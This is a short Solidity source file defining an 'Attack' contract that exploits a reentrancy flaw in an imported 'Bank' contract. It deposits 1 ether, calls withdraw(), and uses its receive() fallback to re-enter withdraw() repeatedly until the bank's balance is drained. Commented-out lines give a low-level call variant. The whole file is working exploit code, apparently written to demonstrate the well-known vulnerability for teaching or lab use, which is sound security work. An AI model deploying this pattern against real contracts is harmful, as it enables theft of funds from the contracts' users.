pragma solidity 0.8.17;

import { Bank } from "./Bank.sol";

contract Attack {
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }

    function attack() external {
        // (bool success, ) = bank.call{ value: 1 ether }(abi.encodeWithSignature("deposit()"));
        // require(success, "Attack: deposit failed");
        // (success, ) = bank.call{ value: 1 ether }(abi.encodeWithSignature("withdraw()"));
        // require(success, "Attack: withdraw failed");
        Bank(bank).deposit{ value: 1 ether }();
        Bank(bank).withdraw();
    }

    receive() external payable {
        // (bool success, ) = bank.call{ value: 1 ether }(abi.encodeWithSignature("withdraw()"));
        if (bank.balance >= 1 ether) {
            Bank(bank).withdraw();
        }
    }
}
